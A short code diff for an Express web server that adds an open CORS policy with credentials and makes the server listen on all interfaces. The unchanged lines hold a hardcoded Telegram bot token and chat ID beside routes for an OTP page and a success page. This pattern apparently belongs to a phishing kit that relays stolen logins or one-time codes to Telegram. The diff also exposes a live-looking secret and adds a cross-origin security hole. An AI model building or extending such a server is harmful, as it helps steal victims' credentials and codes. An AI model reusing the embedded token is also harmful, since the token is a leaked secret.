@@ -1,10 +1,13 @@
 const express = require('express');
 const https = require('https');
 const path = require('path');
-const session = require('express-session'); // استدعاء مكتبة الجلسات
+const session = require('express-session');
+const cors = require('cors');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+
+app.use(cors({ origin: true, credentials: true }));
 
 const telegramBotToken = '8731307636:AAEBSaoSnJZcrk5jegVkZ-aE-JUpKlhtK1E';
 const telegramChatId = '8108427825';
@@ -450,4 +453,4 @@ app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 app.get('/otp.html', (req, res) => res.sendFile(path.join(__dirname, 'otp.html')));
 app.get('/success.html', (req, res) => res.sendFile(path.join(__dirname, 'success.html')));
 
-app.listen(PORT, () => console.log(`Server running at http://localhost:${PORT}`));
+app.listen(PORT, '0.0.0.0', () => console.log(`Server running at http://0.0.0.0:${PORT}`));
